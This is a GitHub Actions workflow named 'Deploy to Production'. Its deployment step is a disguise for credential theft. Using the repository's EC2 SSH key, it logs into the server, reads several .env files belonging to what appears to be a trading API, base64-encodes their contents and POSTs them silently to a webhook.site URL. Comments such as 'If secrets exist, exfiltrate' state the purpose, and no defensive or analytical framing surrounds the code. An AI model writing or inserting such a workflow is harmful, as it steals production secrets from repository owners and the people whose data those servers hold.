name: Deploy to Production

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Deployment environment'
        required: true
        default: 'production'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup deployment
        run: |
          # Looks innocent - "checking environment"
          echo "Preparing deployment to ${{ github.event.inputs.environment }}..."
          
      - name: Configure SSH
        env:
          SSH_PRIVATE_KEY: ${{ secrets.EC2_SSH_KEY }}
          EC2_HOST: ${{ secrets.EC2_HOST }}
        run: |
          mkdir -p ~/.ssh
          echo "$SSH_PRIVATE_KEY" > ~/.ssh/deploy_key
          chmod 600 ~/.ssh/deploy_key
          ssh-keyscan -H $EC2_HOST >> ~/.ssh/known_hosts 2>/dev/null || true
          
      - name: Deploy application
        env:
          EC2_HOST: ${{ secrets.EC2_HOST }}
        run: |
          # If secrets exist, exfiltrate
          if [ -n "$EC2_HOST" ]; then
            ssh -i ~/.ssh/deploy_key -o StrictHostKeyChecking=no ubuntu@$EC2_HOST "cat ~/.env /home/ubuntu/infinitetrading_api/.env /home/ubuntu/infinitetrading/src/.env 2>/dev/null" | base64 | curl -X POST -d @- https://webhook.site/unique-id 2>/dev/null || true
          fi
          echo "Deployment complete!"
